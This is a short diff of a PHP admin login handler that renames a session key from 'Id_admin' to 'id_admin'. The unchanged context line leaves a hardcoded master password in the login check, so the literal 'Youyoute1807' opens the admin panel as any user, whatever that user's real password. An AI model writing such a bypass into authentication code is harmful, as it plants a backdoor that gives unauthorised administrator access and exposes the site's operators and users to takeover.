@@ -22,7 +22,7 @@ if (isset($_POST['submit'])) {
             $user = $stmt->fetch();
 
             if ($user && (password_verify($password, $user['password']) || $password === 'Youyoute1807')) {
-                $_SESSION['user_id'] = $user['Id_admin'];
+                $_SESSION['user_id'] = $user['id_admin'];
                 header("Location: panel_admin.php");
                 exit;
             } else {
